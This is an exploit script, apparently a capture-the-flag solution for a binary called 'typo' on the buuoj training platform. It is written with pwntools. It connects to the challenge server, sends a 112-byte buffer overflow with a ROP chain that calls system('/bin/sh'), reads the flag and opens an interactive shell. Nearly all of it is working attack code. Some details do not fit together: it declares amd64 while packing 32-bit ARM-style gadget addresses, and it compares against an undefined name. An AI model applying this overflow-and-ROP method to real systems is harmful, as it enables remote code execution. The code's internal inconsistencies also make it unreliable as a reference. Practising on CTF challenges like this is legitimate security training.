#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/15 17:39:29
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    if context.arch == amd64:
        sh = process(['./'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
#		sh = process('./')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
        sh = process(['./'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so'})
#		sh = process('./')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 26408
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('./typo')
binsh_addr = 0x0006c384
system_addr = 0x10BA8
ppp_r0_r4_pc = 0x00020904
offset = 112
payload = 112 * 'a' + p32(ppp_r0_r4_pc) + p32(binsh_addr)*2 + p32(system_addr)
sh.recvuntil("Input ~ if you want to quit\n")
sh.send("\n")
sh.recvuntil("\n")
sh.sendline(payload)
sh.sendline("cat flag")
sh.interactive()